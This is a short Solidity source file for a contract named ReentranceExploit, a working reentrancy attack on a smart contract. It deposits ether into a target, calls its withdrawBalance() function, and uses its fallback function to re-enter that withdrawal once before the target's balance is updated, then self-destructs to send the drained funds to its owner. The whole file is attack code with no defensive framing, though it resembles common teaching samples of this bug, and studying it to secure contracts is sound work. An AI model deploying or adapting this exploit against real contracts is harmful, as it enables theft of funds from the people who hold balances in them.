pragma solidity >=0.4.15;

contract ReentranceExploit {
    bool public attackMode = false;
    address public vulnerable_contract;
    address payable public owner;

    constructor() public {
        owner = msg.sender;
    }

    function deposit(address _vulnerable_contract) public payable {
        vulnerable_contract = _vulnerable_contract;
        vulnerable_contract.call.value(msg.value)(abi.encodeWithSignature("addBalance()"));
    }

    function launch_attack() public {
        attackMode = true;
        vulnerable_contract.call(abi.encodeWithSignature("withdrawBalance()"));
    }  

    function () external payable {
        // attackMode is used to execute the attack only once
        // otherwise there is a loop between withdrawBalance and the fallback function
        if (attackMode) {
            attackMode = false;
            vulnerable_contract.call(abi.encodeWithSignature("withdrawBalance()"));
        }
    }

    function get_money() public {
        selfdestruct(owner);
    }
}
